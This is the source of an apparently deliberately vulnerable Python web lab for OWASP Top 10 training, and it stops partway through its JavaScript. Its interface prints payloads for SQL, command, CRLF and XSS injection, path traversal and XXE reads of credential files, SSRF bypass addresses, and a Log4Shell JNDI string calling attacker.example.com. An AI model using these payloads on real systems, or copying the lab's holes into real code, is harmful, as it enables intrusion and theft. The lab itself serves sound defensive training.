#!/usr/bin/env python3
# Lightweight Attack-and-Defense Lab
# Covers OWASP Top 10 + selected L3-L7 attack simulations
# Python 3.6+ standard library only — no external dependencies
# ---------------------------------------------------------------
# IMPORTANT: For authorized training use only.
# All "sensitive" data is synthetic lab data under ./lab_files.
# No real host secrets are read or executed.
# ---------------------------------------------------------------

import base64
import hashlib
import hmac as _hmac
import json
import os
import re
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse, unquote_plus

HOST = "0.0.0.0"
PORT = 8000
MAX_UPLOAD_SIZE = 4 * 1024 * 1024

BASE_DIR      = os.path.dirname(os.path.abspath(__file__))
LAB_FILES_DIR = os.path.join(BASE_DIR, "lab_files")
UPLOADS_DIR   = os.path.join(BASE_DIR, "uploads")
LOG_PATH      = os.path.join(BASE_DIR, "lab_events.log")

# ---------------------------------------------------------------------------
# Fake data stores
# ---------------------------------------------------------------------------
USERS = [
    {"id": 1, "username": "admin",   "password": "Secr3t!",  "role": "administrator"},
    {"id": 2, "username": "analyst", "password": "blue-team", "role": "analyst"},
    {"id": 3, "username": "guest",   "password": "guest123",  "role": "viewer"},
]

XXE_FILES = {
    "passwd": (
        "root:x:0:0:root:/root:/bin/bash\n"
        "nginx:x:998:995::/var/lib/nginx:/sbin/nologin\n"
        "devops:x:1001:1001::/home/devops:/bin/bash"
    ),
    "shadow": "root:$6$FakeSaltXXX$HashedPasswordSimulationOnly:19000:0:99999:7:::",
    "env":    "DB_PASS=LabOnlyPassword123\nJWT_SECRET=lab-jwt-secret-example\nAPI_TOKEN=lab-api-token-example",
    "id_rsa": (
        "-----BEGIN RSA PRIVATE KEY-----\n"
        "MIIEowIBAAKCAQEAFakeLabKeyOnlyNotRealDoNotUse==\n"
        "-----END RSA PRIVATE KEY-----"
    ),
}

EICAR_TEXT = "".join([
    "X5O!P%@AP[4\\PZX54(P^)7CC)7",
    chr(125),
    chr(36),
    "EICAR",
    "-STANDARD-",
    "ANTIVIRUS-",
    "TEST-FILE!$H+H*",
])

SSRF_TARGETS = {
    "169.254.169.254": (
        "AWS IMDS: ami-id=ami-00000000 instance-type=t2.micro "
        "iam/security-credentials/lab-role: "
        "AccessKeyId=AKIAIOSFODNN7EXAMPLE "
        "SecretAccessKey=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    ),
    "127.0.0.1": '{"status":"ok","service":"internal-api","version":"1.0"}',
    "localhost":  '{"status":"ok","service":"internal-api","version":"1.0"}',
    "192.168.0.1": "Router admin panel (Simulated)",
    "10.0.0.1":    "Private subnet gateway (Simulated)",
}

DESER_GADGETS = [
    "java.lang.Runtime", "ProcessBuilder", "exec", "os.system",
    "__reduce__", "subprocess", "pickle", "ObjectInputStream",
]

JWT_WEAK_SECRETS = ["secret", "password", "123456", "jwt", "lab", "token", "changeme"]


# ---------------------------------------------------------------------------
# Bootstrap lab data
# ---------------------------------------------------------------------------
def ensure_lab_data():
    fake_files = {
        "etc/passwd":  XXE_FILES["passwd"],
        "etc/shadow":  XXE_FILES["shadow"],
        "app/.env":    XXE_FILES["env"],
        "keys/id_rsa": XXE_FILES["id_rsa"],
        "app/config.yaml": (
            "database:\n"
            "  host: db.internal\n"
            "  user: lab_admin\n"
            "  password: LabOnlyPassword123\n"
            "redis:\n"
            "  host: cache.internal\n"
            "  password: redispass-fake\n"
        ),
        "app/tokens.json": json.dumps({
            "service_tokens": [
                {"name": "ci-pipeline", "token": "lab-ci-fake-token-aabbccdd"},
                {"name": "monitoring",  "token": "lab-mon-fake-token-eeff0011"},
            ]
        }, indent=2),
    }
    for d in (LAB_FILES_DIR, UPLOADS_DIR):
        if not os.path.isdir(d):
            os.makedirs(d)
    for rel, content in fake_files.items():
        fp = os.path.join(LAB_FILES_DIR, rel)
        dr = os.path.dirname(fp)
        if not os.path.isdir(dr):
            os.makedirs(dr)
        if not os.path.isfile(fp):
            with open(fp, "w") as fh:
                fh.write(content)


# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
def append_event(event_type, status, detail):
    stamp = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
    row = "[%s] type=%s status=%s detail=%s\n" % (stamp, event_type, status, detail)
    with open(LOG_PATH, "a") as fh:
        fh.write(row)


def read_last_log_lines(n=50):
    if not os.path.isfile(LOG_PATH):
        return []
    with open(LOG_PATH, "r") as fh:
        lines = fh.readlines()
    return [l.rstrip("\n") for l in lines[-n:]]


ATTACK_EVENT_RULES = {
    "sqli": {"vulnerable": {"bypass"}, "defended": set(), "benign": {"failed", "ok"}},
    "sqli_error": {"vulnerable": {"probe"}, "defended": set(), "benign": {"ok"}},
    "sqli_search": {"vulnerable": set(), "defended": set(), "benign": {"ok"}},
    "cmdi": {"vulnerable": {"injection"}, "defended": set(), "benign": {"safe"}},
    "crlfi": {"vulnerable": {"inject"}, "defended": set(), "benign": {"ok"}},
    "idor": {"vulnerable": {"hit"}, "defended": set(), "benign": {"miss"}},
    "jwt": {"vulnerable": {"alg_none", "weak_secret"}, "defended": set(), "benign": {"decode"}},
    "xss": {"vulnerable": {"reflected"}, "defended": set()},
    "xss_header": {"vulnerable": {"reflected"}, "defended": set()},
    "lfi": {"vulnerable": {"hit"}, "defended": set(), "benign": {"miss"}},
    "dotfile": {"vulnerable": {"exposed"}, "defended": set()},
    "ssrf_redirect": {"vulnerable": {"bypass"}, "defended": {"blocked"}, "benign": set()},
    "xxe": {"vulnerable": {"hit"}, "defended": set(), "benign": {"miss"}},
    "sqli_b64": {"vulnerable": {"sqli"}, "defended": set(), "benign": {"safe", "decode_error"}},
    "log4shell": {"vulnerable": {"jndi"}, "defended": set(), "benign": {"ok"}},
    "ip_spoof": {"vulnerable": {"trusted"}, "defended": {"rejected"}, "benign": set()},
    "upload": {"vulnerable": {"stored_attack"}, "defended": set(), "benign": {"stored_benign"}},
    "portscan": {"vulnerable": {"scan"}, "defended": set(), "benign": set()},
    "synflood": {"vulnerable": {"simulated"}, "defended": set(), "benign": set()},
}


def build_defense_stats():
    stats = {
        "ok": True,
        "app": {
            "log_events": 0,
            "tracked_events": 0,
            "ignored_events": 0,
            "benign_events": 0,
            "attack_events": 0,
            "total_events": 0,
            "vulnerable": 0,
            "defended": 0,
            "unknown": 0,
            "defense_rate": 0.0,
        },
        "by_type": {},
        "ignored_by_type": {},
    }
    if not os.path.isfile(LOG_PATH):
        return stats

    with open(LOG_PATH, "r") as fh:
        lines = fh.readlines()

    for raw in lines:
        m = re.search(r"\btype=([^\s]+)\s+status=([^\s]+)\s+detail=", raw)
        if not m:
            continue
        stats["app"]["log_events"] += 1
        ev_type = m.group(1)
        status = m.group(2)
        rule = ATTACK_EVENT_RULES.get(ev_type)
        if not rule:
            stats["app"]["ignored_events"] += 1
            stats["ignored_by_type"][ev_type] = stats["ignored_by_type"].get(ev_type, 0) + 1
            continue

        stats["app"]["tracked_events"] += 1
        stats["app"]["total_events"] += 1
        bucket = stats["by_type"].setdefault(ev_type, {
            "total": 0,
            "vulnerable": 0,
            "defended": 0,
            "benign": 0,
            "unknown": 0,
        })
        bucket["total"] += 1

        benign_set = rule.get("benign", set())
        if status in benign_set:
            stats["app"]["benign_events"] += 1
            bucket["benign"] += 1
            continue

        stats["app"]["attack_events"] += 1
        if status in rule["vulnerable"]:
            stats["app"]["total_events"] += 1
            stats["app"]["vulnerable"] += 1
            bucket["vulnerable"] += 1
        elif status in rule["defended"]:
            stats["app"]["total_events"] += 1
            stats["app"]["defended"] += 1
            bucket["defended"] += 1
        else:
            stats["app"]["total_events"] += 1
            stats["app"]["unknown"] += 1
            bucket["unknown"] += 1

    decided = stats["app"]["vulnerable"] + stats["app"]["defended"]
    if decided > 0:
        stats["app"]["defense_rate"] = round((stats["app"]["defended"] * 100.0) / decided, 2)
    return stats


# ---------------------------------------------------------------------------
# Multipart file upload parser (no cgi module)
# ---------------------------------------------------------------------------
def parse_multipart_artifact(body_bytes, content_type):
    marker = "boundary="
    idx = content_type.find(marker)
    if idx < 0:
        return None, None
    boundary = content_type[idx + len(marker):].strip().strip('"')
    if not boundary:
        return None, None
    sep = ("--" + boundary).encode("utf-8")
    for part in body_bytes.split(sep):
        if not part or part in (b"--", b"--\r\n"):
            continue
        chunk = part.strip(b"\r\n")
        hdr_b, sep2, payload = chunk.partition(b"\r\n\r\n")
        if not sep2:
            continue
        hdrs = hdr_b.decode("utf-8", "ignore")
        if 'name="artifact"' not in hdrs:
            continue
        fn = "upload.bin"
        tok = 'filename="'
        ti = hdrs.find(tok)
        if ti >= 0:
            ts = ti + len(tok)
            te = hdrs.find('"', ts)
            if te > ts:
                fn = hdrs[ts:te]
        clean = os.path.basename(fn) or "upload.bin"
        data  = payload[:-2] if payload.endswith(b"\r\n") else payload
        return clean, data
    return None, None


# ---------------------------------------------------------------------------
# HTML frontend
# ---------------------------------------------------------------------------
HTML_CONTENT = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Attack &amp; Defense Lab</title>
<style>
:root{
    --bg0:#04121f;--bg1:#081a2e;--bg2:#0b233c;
    --surface:#0f1f33;--surface2:#122843;--line:#1f4668;
    --text:#d9f4ff;--muted:#8db5c8;
    --blue:#1aa4ff;--blue-d:#1177c9;
    --green:#18d6b2;--red:#ff5f78;--amber:#ffc857;
    --glow:0 0 0 1px rgba(26,164,255,.35),0 0 20px rgba(26,164,255,.15);
    --sh:0 14px 34px rgba(0,0,0,.38);
}
*{box-sizing:border-box;margin:0;padding:0}
body{
    font-family:"Trebuchet MS","Verdana","Tahoma",sans-serif;
    background:
        radial-gradient(1200px 600px at 10% -10%,rgba(24,214,178,.14),transparent 60%),
        radial-gradient(1000px 700px at 100% 0%,rgba(26,164,255,.22),transparent 62%),
        linear-gradient(150deg,var(--bg0) 0%,var(--bg1) 45%,var(--bg2) 100%);
    color:var(--text);
    line-height:1.5;
    min-height:100vh;
    position:relative;
    overflow-x:hidden;
}
body:before{
    content:"";
    position:fixed;
    inset:0;
    pointer-events:none;
    opacity:.2;
    background-image:
        linear-gradient(rgba(26,164,255,.22) 1px,transparent 1px),
        linear-gradient(90deg,rgba(26,164,255,.16) 1px,transparent 1px);
    background-size:30px 30px,30px 30px;
    animation:gridDrift 16s linear infinite;
}
body:after{
    content:"";
    position:fixed;
    inset:0;
    pointer-events:none;
    opacity:.11;
    background:repeating-linear-gradient(
        180deg,
        rgba(120,220,255,.16) 0px,
        rgba(120,220,255,.16) 1px,
        transparent 2px,
        transparent 4px
    );
    animation:scanlineDrift 7s linear infinite;
}
.wrap{max-width:1300px;margin:0 auto;padding:20px}
.hero{
    background:linear-gradient(160deg,rgba(15,31,51,.95),rgba(18,40,67,.93));
    border:1px solid var(--line);
    border-radius:14px;
    box-shadow:var(--sh),var(--glow);
    padding:20px;
    margin-bottom:16px;
    position:relative;
    overflow:hidden;
}
.hero:after{
    content:"";
    position:absolute;
    top:-40%;
    right:-20%;
    width:260px;
    height:260px;
    border-radius:50%;
    background:radial-gradient(circle,rgba(26,164,255,.25),transparent 70%);
}
.status-strip{
    margin-top:10px;
    display:flex;
    flex-wrap:wrap;
    gap:8px;
}
.status-pill{
    display:inline-flex;
    align-items:center;
    gap:6px;
    font-size:11px;
    letter-spacing:.2px;
    color:#9fd4ea;
    border:1px solid #275679;
    border-radius:999px;
    padding:4px 10px;
    background:rgba(6,22,38,.6);
}
.status-dot{
    width:8px;
    height:8px;
    border-radius:50%;
    background:#8aa8ba;
    box-shadow:0 0 0 1px rgba(255,255,255,.08);
}
.status-dot.ok{background:#18d6b2;box-shadow:0 0 10px rgba(24,214,178,.65)}
.status-dot.warn{background:#ffc857;box-shadow:0 0 10px rgba(255,200,87,.5)}
.status-dot.pulse{animation:lampPulse 1.8s ease-in-out infinite}
h1{color:#b8ecff;font-size:26px;margin-bottom:6px;letter-spacing:.3px;text-shadow:0 0 18px rgba(26,164,255,.25)}
.sub{color:var(--muted);font-size:13px}
h3{color:#9cdef8;font-size:15px;margin-bottom:8px}
.tabs{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:16px}
.tab{
    padding:7px 14px;
    border:1px solid rgba(26,164,255,.55);
    border-radius:20px;
    background:rgba(11,35,60,.72);
    color:#8ed7ff;
    cursor:pointer;
    font-size:13px;
    font-weight:600;
    transition:all .2s ease;
}
.tab.active,.tab:hover{background:linear-gradient(180deg,var(--blue) 0%,var(--blue-d) 100%);color:#fff;box-shadow:0 0 16px rgba(26,164,255,.35)}
.section{display:none}.section.active{display:block}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:14px}
.card{
    background:linear-gradient(160deg,var(--surface),var(--surface2));
    border:1px solid var(--line);
    border-radius:12px;
    box-shadow:var(--sh);
    padding:16px;
    transition:transform .18s ease,border-color .18s ease,box-shadow .18s ease;
}
.card:hover{transform:translateY(-2px);border-color:rgba(26,164,255,.65);box-shadow:var(--sh),var(--glow)}
.tip{color:var(--muted);font-size:12px;margin-bottom:10px}
.tip code{background:rgba(16,62,96,.55);color:#c8f2ff;padding:1px 4px;border-radius:3px;font-family:"Liberation Mono","Consolas",monospace;font-size:12px}
label{display:block;font-size:12px;font-weight:600;color:#2b4152;margin:8px 0 3px}
label{color:#7cc0dc}
input,textarea,select{
    width:100%;
    border:1px solid #356488;
    border-radius:7px;
    padding:8px;
    font-size:13px;
    background:#0a1a2d;
    color:var(--text);
}
input:focus,textarea:focus,select:focus{outline:none;border-color:#43c7ff;box-shadow:0 0 0 2px rgba(26,164,255,.2)}
textarea{resize:vertical;min-height:60px}
.btn{margin-top:10px;width:100%;border:none;border-radius:7px;padding:9px;color:#fff;font-weight:700;cursor:pointer;font-size:13px;background:linear-gradient(180deg,var(--blue) 0%,var(--blue-d) 100%);transition:transform .14s ease,filter .14s ease,box-shadow .14s ease}
.btn:hover{filter:brightness(1.04);transform:translateY(-1px);box-shadow:0 0 16px rgba(26,164,255,.3)}
.btn-sm{padding:6px 10px;width:auto;margin-top:0;font-size:12px;border-radius:6px;border:none;color:#fff;cursor:pointer;background:var(--blue-d)}
.result{margin-top:10px;min-height:70px;border:1px solid #2a597e;border-radius:8px;background:#081a2d;padding:10px;font-size:12px;white-space:pre-wrap;overflow-wrap:break-word;font-family:"Liberation Mono","Consolas",monospace;color:#d9f4ff}
.ok{color:var(--green);font-weight:700}
.warn{color:var(--red);font-weight:700}
.info{color:var(--amber);font-weight:700}
.badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 6px;border-radius:10px;margin-left:6px;vertical-align:middle}
.badge-red{background:rgba(255,95,120,.18);color:#ffb0bf;border:1px solid rgba(255,95,120,.35)}
.log-box{background:#051525;color:#87ffd8;border:1px solid #2d5c7f;border-radius:8px;padding:12px;font-size:11px;min-height:100px;white-space:pre-wrap;font-family:"Liberation Mono","Consolas",monospace;overflow-y:auto;max-height:280px;position:relative}
.log-box:after{content:"_";position:absolute;right:10px;bottom:8px;color:#87ffd8;opacity:.9;animation:cursorBlink 1s steps(1,end) infinite;pointer-events:none}
.defense-viz{display:flex;flex-wrap:wrap;gap:14px;align-items:center;margin-bottom:12px;padding:10px;border:1px solid #2a597e;border-radius:8px;background:#081a2d}
.pie3d{--pct:0;position:relative;width:140px;height:140px;border-radius:50%;background:conic-gradient(#18d6b2 calc(var(--pct)*1%), #ff5f78 0);box-shadow:0 10px 18px rgba(0,0,0,.35), inset 0 2px 10px rgba(255,255,255,.1)}
.pie3d:before{content:"";position:absolute;left:8px;right:8px;top:8px;bottom:8px;border-radius:50%;background:#071726;box-shadow:inset 0 0 0 1px rgba(31,70,104,.7)}
.pie3d-center{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:700;color:#b8ecff;text-shadow:0 0 10px rgba(26,164,255,.35)}
.viz-legend{font-size:12px;line-height:1.6;color:#9fd4ea}
footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
@keyframes gridDrift{
    0%{transform:translate3d(0,0,0)}
    100%{transform:translate3d(30px,30px,0)}
}
@keyframes scanlineDrift{
    0%{transform:translateY(0)}
    100%{transform:translateY(8px)}
}
@keyframes lampPulse{
    0%,100%{transform:scale(1);filter:brightness(1)}
    50%{transform:scale(1.12);filter:brightness(1.2)}
}
@keyframes cursorBlink{
    0%,49%{opacity:1}
    50%,100%{opacity:0}
}
@media (max-width: 700px){
    .wrap{padding:12px}
    .tabs{gap:5px}
    .tab{font-size:12px;padding:6px 10px}
    .status-strip{gap:6px}
    .status-pill{font-size:10px;padding:3px 8px}
}
</style>
</head>
<body>
<div class="wrap">
<div class="hero">
  <h1>Attack &amp; Defense Lab <span class="badge badge-red">Huawei Cloud Security PoC Only - Author: Jason Gao</span></h1>
    <p class="sub">OWASP Top 10 attack paths + L3-L7 network security simulations. All sensitive files are synthetic under <code>./lab_files</code>; no real system data is read or executed.</p>
    <div class="status-strip">
        <span class="status-pill"><span class="status-dot ok pulse"></span>LAB ONLINE</span>
        <span class="status-pill"><span class="status-dot warn pulse"></span>SIMULATION MODE</span>
        <span class="status-pill"><span class="status-dot ok"></span>NO EXTERNAL DEPENDENCIES</span>
    </div>
</div>
<div class="tabs">
    <div class="tab active" data-tab="injection" data-label="Injection (A03)" onclick="switchTab('injection')">Injection (A03)</div>
    <div class="tab" data-tab="xss" data-label="XSS (A03)" onclick="switchTab('xss')">XSS (A03)</div>
    <div class="tab" data-tab="upload" data-label="Upload" onclick="switchTab('upload')">Upload</div>
    <div class="tab" data-tab="authz" data-label="Auth &amp; Access (A01/A07)" onclick="switchTab('authz')">Auth &amp; Access (A01/A07)</div>
    <div class="tab" data-tab="lfi" data-label="File Access (A01/A05)" onclick="switchTab('lfi')">File Access (A01/A05)</div>
    <div class="tab" data-tab="ssrf" data-label="SSRF Redirect (A10)" onclick="switchTab('ssrf')">SSRF Redirect (A10)</div>
    <div class="tab" data-tab="xxe" data-label="XXE (A05)" onclick="switchTab('xxe')">XXE (A05)</div>
    <div class="tab" data-tab="deser" data-label="Integrity (A08/A06)" onclick="switchTab('deser')">Integrity (A08/A06)</div>
    <div class="tab" data-tab="network" data-label="Network (L3-L4)" onclick="switchTab('network')">Network (L3-L4)</div>
    <div class="tab" data-tab="logs" data-label="Logs" onclick="switchTab('logs')">Logs</div>
</div>

<!-- INJECTION -->
<div class="section active" id="sec-injection">
<div class="grid">
<div class="card"><h3>A03 &mdash; SQL Injection (Login Bypass)</h3>
<p class="tip">Bypass: <code>' OR '1'='1</code> | UNION: <code>' UNION SELECT 1,username,password FROM users--</code></p>
<label>Username</label><input id="sqli-u" value="admin">
<label>Password</label><input id="sqli-p" value="password">
<button class="btn" onclick="api('sqli','sqli-out',{username:g('sqli-u'),password:g('sqli-p')})">Send</button>
<div id="sqli-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; SQL Injection (Error-Based)</h3>
<p class="tip">Probe: <code>'</code> | Error-based: <code>' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--</code></p>
<label>Search Term</label><input id="sqli2-q" value="widget">
<button class="btn" onclick="api('sqli2','sqli2-out',{q:g('sqli2-q')})">Search</button>
<div id="sqli2-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; OS Command Injection</h3>
<p class="tip">Chain: <code>127.0.0.1; cat /etc/passwd</code> | Pipe: <code>127.0.0.1 | id</code> | Backtick: <code>`whoami`</code></p>
<label>Host</label><input id="cmdi-h" value="127.0.0.1">
<button class="btn" onclick="api('cmdi','cmdi-out',{host:g('cmdi-h')})">Ping</button>
<div id="cmdi-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; CRLF / Header Injection</h3>
<p class="tip">Inject: <code>normal%0d%0aSet-Cookie:%20session=hijacked</code></p>
<label>Redirect Value</label><input id="crlf-i" value="normal%0d%0aSet-Cookie:%20session=hijacked">
<button class="btn" onclick="api('crlfi','crlf-out',{value:g('crlf-i')})">Send</button>
<div id="crlf-out" class="result"></div></div>
</div></div>

<!-- AUTH/AUTHZ -->
<div class="section" id="sec-authz">
<div class="grid">
<div class="card"><h3>A07 &mdash; Brute Force Login</h3>
<p class="tip">Credential stuffing simulation. Try admin with wordlist below.</p>
<label>Username</label><input id="bf-u" value="admin">
<label>Passwords (one per line)</label>
<textarea id="bf-pw">password\n123456\nSecr3t!\nletmein\nadmin</textarea>
<button class="btn" onclick="bruteForce()">Run Brute Force</button>
<div id="bf-out" class="result"></div></div>

<div class="card"><h3>A01 &mdash; IDOR (User Profile)</h3>
<p class="tip">Enumerate user IDs 1,2,3 without owning the record.</p>
<label>User ID</label><input id="idor-id" value="2" type="number">
<button class="btn" onclick="api('idor','idor-out',{id:g('idor-id')})">Fetch Profile</button>
<div id="idor-out" class="result"></div></div>

<div class="card"><h3>A07 &mdash; JWT Tampering</h3>
<p class="tip">alg:none bypass removes signature. Weak secret brute-force tries common keys.</p>
<label>JWT Token</label>
<textarea id="jwt-token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidmlld2VyIn0.FAKE_SIGNATURE</textarea>
<label>Attack</label>
<select id="jwt-attack">
  <option value="none_alg">alg:none bypass</option>
  <option value="weak_secret">weak secret brute-force</option>
  <option value="decode">decode only</option>
</select>
<button class="btn" onclick="api('jwt','jwt-out',{token:g('jwt-token'),attack:g('jwt-attack')})">Attack</button>
<div id="jwt-out" class="result"></div></div>

</div></div>

<!-- XSS -->
<div class="section" id="sec-xss">
<div class="grid">
<div class="card"><h3>A03 &mdash; Reflected XSS</h3>
<p class="tip">Try: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert('xss')&gt;</code></p>
<label>Input</label><input id="rxss-i" value="&lt;img src=x onerror=alert('rxss')&gt;">
<button class="btn" onclick="reflectedXSS()">Reflect</button>
<div id="rxss-out" class="result"></div></div>

<div class="card"><h3>A03 &mdash; XSS via HTTP Header</h3>
<p class="tip">Server reflects X-Custom-Name header without escaping.</p>
<label>X-Custom-Name value</label><input id="hxss-i" value="&lt;script&gt;alert('hdr')&lt;/script&gt;">
<button class="btn" onclick="api('headerxss','hxss-out',{value:g('hxss-i')})">Send</button>
<div id="hxss-out" class="result"></div></div>
</div></div>

<!-- LFI -->
<div class="section" id="sec-lfi">
<div class="grid">
<div class="card"><h3>A01 &mdash; LFI / Path Traversal</h3>
<p class="tip">Targets: <code>../../etc/passwd</code> | <code>../../etc/shadow</code> | <code>../app/.env</code> | <code>../keys/id_rsa</code> | <code>../app/config.yaml</code> | <code>../app/tokens.json</code><br>URL-encoded: <code>..%2F..%2Fetc%2Fpasswd</code><br>Double-encoded: <code>..%252F..%252Fetc%252Fpasswd</code></p>
<label>File Path / Target</label><input id="lfi-t" value="../../etc/passwd">
<button class="btn" onclick="api('lfi','lfi-out',{target:g('lfi-t')})">Request</button>
<div id="lfi-out" class="result"></div></div>

<div class="card"><h3>A05 &mdash; Backup / Dot-File Disclosure</h3>
<p class="tip">Targets: <code>.env</code> | <code>.git/config</code> | <code>web.config.bak</code> | <code>app.config.bak</code></p>
<label>File</label><input id="dot-f" value=".env">
<button class="btn" onclick="api('dotfile','dot-out',{file:g('dot-f')})">Fetch</button>
<div id="dot-out" class="result"></div></div>
</div></div>

<!-- SSRF -->
<div class="section" id="sec-ssrf">
<div class="grid">
<div class="card"><h3>A10 &mdash; SSRF via Open Redirect</h3>
<p class="tip">IP bypass wrappers: <code>http://0x7f000001/</code> | <code>http://127.1/</code> | <code>http://[::1]/</code></p>
<label>Redirect-To URL</label><input id="ssrf2-u" value="http://127.0.0.1/admin">
<button class="btn" onclick="api('ssrf_redirect','ssrf2-out',{url:g('ssrf2-u')})">Follow Redirect</button>
<div id="ssrf2-out" class="result"></div></div>
</div></div>

<!-- XXE -->
<div class="section" id="sec-xxe">
<div class="grid">
<div class="card"><h3>A05 &mdash; XXE File Read</h3>
<p class="tip">File targets: <code>passwd</code> <code>shadow</code> <code>env</code> <code>id_rsa</code></p>
<label>XML Payload</label>
<textarea id="xxe-xml">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</textarea>
<button class="btn" onclick="api('xxe','xxe-out',{xml:g('xxe-xml')})">Parse XML</button>
<div id="xxe-out" class="result"></div></div>

</div></div>

<!-- DESER -->
<div class="section" id="sec-deser">
<div class="grid">
<div class="card"><h3>A03 &mdash; Base64 SQL Injection (UNION)</h3>
<p class="tip">Encode SQLi payload to test naive filter bypasses.<br>Example payload: <code>' UNION SELECT 1,username,password FROM users--</code><br>Base64 sample: <code>JyBVTklPTiBTRUxFQ1QgMSx1c2VybmFtZSxwYXNzd29yZCBGUk9NIHVzZXJzLS0=</code></p>
<label>Plain SQLi Payload</label>
<textarea id="deser-plain">' UNION SELECT 1,username,password FROM users--</textarea>
<label>Base64 Payload</label>
<textarea id="deser-d">JyBVTklPTiBTRUxFQ1QgMSx1c2VybmFtZSxwYXNzd29yZCBGUk9NIHVzZXJzLS0=</textarea>
<div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:10px">
<button class="btn-sm" onclick="encodeAndTest()">Encode &amp; Test</button>
<button class="btn-sm" onclick="api('deser','deser-out',{payload:g('deser-d')})">Decode &amp; Test</button>
</div>
<div id="deser-out" class="result"></div></div>

<div class="card"><h3>A06 &mdash; Log4Shell Simulation (CVE-2021-44228)</h3>
<p class="tip">JNDI lookup: <code>${jndi:ldap://attacker.example.com/a}</code></p>
<label>User-Agent / Input</label>
<input id="log4j-i" value="${jndi:ldap://attacker.example.com/a}">
<button class="btn" onclick="api('log4shell','log4j-out',{input:g('log4j-i')})">Send</button>
<div id="log4j-out" class="result"></div></div>
</div></div>

<!-- UPLOAD -->
<div class="section" id="sec-upload">
<div class="grid">
<div class="card"><h3>A08 &mdash; Unrestricted File Upload</h3>
<p class="tip">Upload any file. Server can detect EICAR-like test signatures for AV/EDR correlation.<br>
For NGFW compatibility, no EICAR string is pre-rendered in this page.</p>
<label>File</label><input id="upl-f" type="file">
<label>Bypass extension suffix</label>
<select id="upl-ext">
  <option value="">none</option>
  <option value=".php">.php</option>
  <option value=".php5">.php5</option>
  <option value=".phtml">.phtml</option>
  <option value=".jsp">.jsp</option>
  <option value=".aspx">.aspx</option>
</select>
<button class="btn" onclick="uploadFile()">Upload</button>
<div id="upl-out" class="result"></div></div>

</div></div>

<!-- NETWORK -->
<div class="section" id="sec-network">
<div class="grid">
<div class="card"><h3>L3 &mdash; IP Spoofing</h3>
<p class="tip">Bypass IP-based allow-lists via X-Forwarded-For header.</p>
<label>Spoofed Source IP</label><input id="spoof-ip" value="10.0.0.1">
<label>Target Endpoint</label><input id="spoof-ep" value="/api/health">
<button class="btn" onclick="api('ip_spoof','spoof-out',{ip:g('spoof-ip'),endpoint:g('spoof-ep')})">Spoof</button>
<div id="spoof-out" class="result"></div></div>

<div class="card"><h3>L3/L4 &mdash; Port Scan Simulation</h3>
<p class="tip">Simulated internal port probe. No real TCP connections made.</p>
<label>Target Host</label><input id="scan-h" value="127.0.0.1">
<label>Ports (comma separated)</label><input id="scan-p" value="22,80,443,3306,6379,8080,8443">
<button class="btn" onclick="api('portscan','scan-out',{host:g('scan-h'),ports:g('scan-p')})">Scan</button>
<div id="scan-out" class="result"></div></div>

<div class="card"><h3>L4 &mdash; SYN Flood Simulation</h3>
<p class="tip">No real packets sent. Generates log events for WAF/IDS correlation.</p>
<label>Target Host</label><input id="syn-h" value="192.168.1.100">
<label>Target Port</label><input id="syn-p" value="80">
<label>Simulated Packet Count</label><input id="syn-c" value="1000">
<button class="btn" onclick="api('synflood','syn-out',{host:g('syn-h'),port:g('syn-p'),count:g('syn-c')})">Simulate</button>
<div id="syn-out" class="result"></div></div>

<div class="card"><h3>L7 &mdash; HTTP Flood / Rate Limit Test</h3>
<p class="tip">Rapid repeated GET requests to trigger rate-limit or WAF rules.</p>
<label>Endpoint</label><input id="flood-ep" value="/api/health">
<label>Request Count</label><input id="flood-n" value="20" type="number">
<button class="btn" onclick="httpFlood()">Start Flood</button>
<div id="flood-out" class="result"></div></div>

</div></div>

<!-- LOGS -->
<div class="section" id="sec-logs">
<div style="display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap">
    <button class="btn-sm" onclick="refreshLogsAndStats()">Refresh Logs</button>
  <button class="btn-sm" onclick="listLabFiles()">List Lab Files</button>
    <button class="btn-sm" onclick="loadDefenseStats()">Defense Stats</button>
  <button class="btn-sm" onclick="clearLogs()">Clear Logs</button>
</div>
<div class="defense-viz">
    <div class="pie3d" id="defense-pie">
        <div class="pie3d-center" id="defense-pie-center">0%</div>
    </div>
    <div class="viz-legend" id="defense-legend">Total Requests: 0\nIntercepted Success: 0\nNot Intercepted: 0</div>
</div>
<div id="defense-out" class="result" style="margin-bottom:12px">Defense stats not loaded.</div>
<div id="log-box" class="log-box">Loading...</div>
</div>

</div><!-- /wrap -->
<footer>Training environment only &mdash; do not expose to the internet or use against real systems.</footer>
<script>
function g(id){ return document.getElementById(id).value; }
function show(id,t){ var e=document.getElementById(id); if(e) e.textContent=t; }
function showHtml(id,h){ var e=document.getElementById(id); if(e) e.innerHTML=h; }

var clientDefenseStats={
    total:0,http_ok:0,http_error:0,network_blocked:0,timeout:0,aborted:0
};

function beginClientTrace(){
    clientDefenseStats.total++;
    var done=false;
    return function(kind){
        if(done) return;
        done=true;
        if(kind==='http_ok') clientDefenseStats.http_ok++;
        else if(kind==='http_error') clientDefenseStats.http_error++;
